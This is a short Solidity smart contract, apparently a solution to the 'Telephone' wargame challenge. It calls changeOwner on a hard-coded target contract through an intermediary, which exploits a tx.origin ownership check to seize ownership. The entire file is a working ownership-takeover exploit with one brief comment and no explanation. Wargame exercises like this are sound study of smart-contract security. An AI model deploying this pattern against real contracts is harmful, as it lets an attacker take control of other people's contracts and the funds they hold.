// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

    address target = 0x1E9512A351d3d8fFf54E648eC4CC196dcfD2143D;

    function call1(address owner) public {
        call2(owner);
    }

    // Second function not needed but just a test
    function call2(address owner) private {

        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", owner);
        (bool success, ) = target.call(payload);

        assert(success);
    }
}